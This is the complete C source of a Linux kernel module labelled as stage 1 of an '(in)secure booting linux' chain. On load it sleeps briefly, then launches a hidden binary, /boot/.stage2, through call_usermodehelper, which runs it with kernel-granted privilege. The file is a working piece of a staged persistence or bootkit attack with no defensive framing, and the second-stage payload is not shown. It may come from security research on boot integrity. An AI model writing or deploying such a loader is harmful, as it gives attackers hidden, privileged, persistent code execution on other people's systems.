/* (in)secure booting linux
 * Angel Suarez-B Martin (n0w)
 * stage1
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/delay.h>

MODULE_AUTHOR("Angel Suarez-B. Martin (n0w)");
MODULE_DESCRIPTION("(in)secure booting linux stage 1 kernel module");

char * envp[] = { "HOME=/", NULL };
char * argv[] = { "/boot/.stage2", NULL };

static int start(void)
{
     printk(KERN_INFO "[nn5ed] Stage 1 loaded. Waiting for system to finish booting...\n");
     msleep(1000);
     
     //Load next stage
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     return 0;
}

static void end(void)
{
     printk(KERN_INFO "[nn5ed] All done :)\n");
}

module_init(start);
module_exit(end);

